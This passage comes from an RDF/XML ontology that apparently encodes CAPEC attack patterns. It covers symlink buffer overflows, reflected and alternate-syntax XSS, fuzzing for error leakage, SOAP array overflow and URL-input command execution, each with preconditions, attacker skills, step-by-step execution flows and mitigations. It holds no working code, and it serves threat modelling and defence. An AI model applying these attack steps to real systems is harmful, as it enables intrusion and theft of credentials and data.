      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the software during the development phase. This access is often obtained via insider access to include the 3rd party component after deployment.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker503">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#45">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Buffer Overflow via Symbolic Links"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack503">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#45"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::285::302::118::119::74::20::680::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Exploit:DESCRIPTION:The attacker creates or modifies a symbolic link pointing to a resources (e.g.  file  directory). The content of the symbolic link file includes out-of-bounds (e.g. excessive length) data.::STEP:2:PHASE:Exploit:DESCRIPTION:The target host consumes the data pointed to by the symbolic link file. The target host may either intentionally expect to read a symbolic link or it may be fooled by the replacement of the original resource and read the attackers&apos; symbolic link.::STEP:3:PHASE:Exploit:DESCRIPTION:While consuming the data  the target host does not check for buffer boundary which can lead to a buffer overflow. If the content of the data is controlled by the attacker  this is an avenue for remote code execution.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::285::302::118::119::74::20::680::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker can create symbolic link on the target host.::The target host does not perform correct boundary checking while consuming data from a resources.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker37">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#547"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack37"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker502">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#591">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:63::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Reflected XSS"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack502">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#591"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::79::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful Reflected XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Authorization Access Control Gain Privileges A successful Reflected XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful Reflected attack can enable an adversary run arbitrary code of their choosing  thus enabling a complete compromise of the application.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful Reflected attack can allow an adversary to tamper with application data.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::79::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application that leverages a client-side web browser with scripting enabled.::An application that fail to adequately sanitize or encode untrusted input.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Requires the ability to write malicious scripts and embed them into HTTP requests.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack139"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker323">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#144"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack323"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted web site must include unpublished services within its web tree. The nature of these services determines the severity of this attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker456">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#129"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack456"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::682::822::823::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must have a pointer variable that the attacker can influence to hold an arbitrary value.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker39">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#125"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack39"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::404::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Any target that services requests is vulnerable to this attack on some level of scale.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A script or program capable of generating more requests than the target can handle  or a network or cluster of objects all capable of making simultaneous requests.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker455">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#587"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack455"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The user&apos;s browser must have vulnerabilities in its implementation of the same-origin policy. It allows certain data in a loaded page to originate from different servers/domains.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker322">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#143"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack322"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted web site must include pages within its published tree that are not connected to its tree of links. The sensitivity of the content of these pages determines the severity of this attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow accounts to be a local administrator on more than one system.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack513"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker321">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#522"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack321"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Advanced knowledge of the design of the system.:LEVEL:High::SKILL:Hardware creation and manufacture of replacement components.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker454">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#27"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack454"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::367::61::662::689::667::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker is able to create Symlink links on the target host.::Tainted data from the attacker is used and copied to temporary files.::The target host does insecure temporary file creation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack is sophisticated because the attacker has to overcome a few challenges such as creating symlinks on the target host during a precise timing  inserting malicious data in the temporary file and have knowledge about the temporary files created (file name and function which creates them).:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker320">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#208"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack320"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::602::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted server must rely on the client to correctly perform monetary calculations and must fail to detect errors in these calculations.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client&apos;s purse logic. Reverse engineering tools would be necessary for this.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type  character  and encoding enforcement::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not  the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content  including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser  web servers  and plug in technologies  staying current on patch release that deal with XSS countermeasures mitigates this.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack193">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#199">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XSS Using Alternate Syntax"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::87::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application) Using a browser or an automated tool  an attacker follows all public links on a web site. He records all the links he finds.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser&apos;s plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt injection payload variations on input parameters) Possibly using an automated tool  an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. The payloads are designed to bypass incomplete filtering (e.g.  incomplete HTML encoding etc.) and tries many variations of characters injection that would enable the XSS payload. He records all the responses from the server that include unmodified versions of his script.TECHNIQUE:Use a list of XSS probe strings to inject in parameters of known URLs. If possible  the probe strings contain a unique identifier. Attempt numerous variations based on form  format  syntax &amp; encoding.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:(Steal session IDs  credentials  page content  etc.) As the attacker succeeds in exploiting the vulnerability  he can choose to steal user&apos;s credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Forceful browsing) When the attacker targets the current application or another one (through CSRF vulnerabilities)  the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws  but it can also be used to create a widespread attack against a particular website on the user&apos;s current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:(Content spoofing) By manipulating the content  the attacker targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and exposes attacker-modified invalid information to the user on the current web page.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker453">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#80"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack453"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::173::172::180::181::171::73::21::74::20::697::692::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application&apos;s UTF-8 decoder accepts and interprets illegal UTF-8 characters or non-shortest format of UTF-8 encoding.::Input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker can inject different representation of a filtered character in UTF-8 format.:LEVEL:Low::SKILL:An attacker may craft subtle encoding of input data by using the knowledge that she has gathered about the target host.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.::Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.::Implementation: If the session identifier is used for authentication  such as in the so-called single sign on use cases  then ensure that it is protected at the same level of assurance as authentication tokens.::Implementation: If the web or application server supports it  then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.::Design: Use strong session identifiers that are protected in transit and at rest.::Implementation: Utilize a session timeout for all sessions  for example 20 minutes. If the user does not explicitly logout  the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.::Implementation: Verify of authenticity of all session IDs at runtime.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack364"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker327">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#215">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:54::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Fuzzing and observing application log data/errors for application mapping"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack327">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#215"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::209::532::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Probing) The attacker uses fuzzing tools to send random malformed messages to web server and observes for server&apos;s log or error message.TECHNIQUE:The attacker uses fuzzing tools to send random malformed messages to web server and observes for server&apos;s log or error message.::STEP:2:PHASE:Experiment:DESCRIPTION:(Modify the parameters to get the desired information from the error messages.) Attacker usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation  the attacker may try changing the origin IP addresses or client browser identification strings or start a new session from where he left off in obfuscating the attack.TECHNIQUE:Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.:TECHNIQUE:If the application rejects the large amount of fuzzing messages from the same host machine  the attacker needs to hide the attacks by changing the IP addresses or other credentials.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::209::532::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must fail to sanitize incoming messages adequately before processing.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Although fuzzing parameters is not difficult  and often possible with automated fuzzing tools  interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform  the languages and packages used as well as software design.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Fuzzing tools  which automatically generate and send message variants  are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application&apos;s log and/or error messages in order to collect information about the target.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker459">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#4">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Alternative IP Address Encodings"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack459">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#4"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::291::173::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::291::173::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target software must fail to anticipate all of the possible valid encodings of an IP/web address.::The adversary must have the ability to communicate with the server.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary has only to try IP address format combinations.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively  the adversary can simply try to brute-force various encoding possibilities.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker326">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#214"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack326"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::209::388::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must fail to sanitize incoming messages adequately before processing and must generate a stack trace in at least some error situations.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the stack trace produced by the target application. Fuzzing tools  which automatically generate and send message variants  are necessary for this attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker325">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#256">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#SOAP Array Overflow"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack325">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#256"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::805::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::805::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted SOAP server must trust that the array size as stated in messages it receives is correct  but read through the entire content of the message regardless of the stated size of the array.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must be able to craft malformed SOAP messages  specifically  messages with arrays where the stated array size understates the actual size of the array in the message.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker458">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#48">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:212::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Passing Local Filenames to Functions That Expect a URL"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack458">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#48"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::241::706::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify web application URL inputs) Review application inputs to find those that are designed to be URLs.TECHNIQUE:Manually navigate web site pages to identify URLs.:TECHNIQUE:Use automated tools to identify URLs.::STEP:2:PHASE:Experiment:DESCRIPTION:(Identify URL inputs allowing local access.) Execute test local commands via each URL input to determine which are successful.TECHNIQUE:Manually execute a local command (such as &apos;pwd&apos;) via the URL inputs.:TECHNIQUE:Using an automated tool  test each URL input for weakness.::STEP:3:PHASE:Exploit:DESCRIPTION:(Execute malicious commands) Using the identified URL inputs that allow local command execution  execute malicious commands.TECHNIQUE:Execute local commands via the URL input.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::241::706::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim&apos;s software must not differentiate between the location and type of reference passed the client software  e.g. browser::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Attacker identifies known local files to exploit:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Only allow known URL to be included as remote flash movies in a flash application::Configuration: Properly configure the crossdomain.xml file to only include the known domains that should host remote flash movies.::">
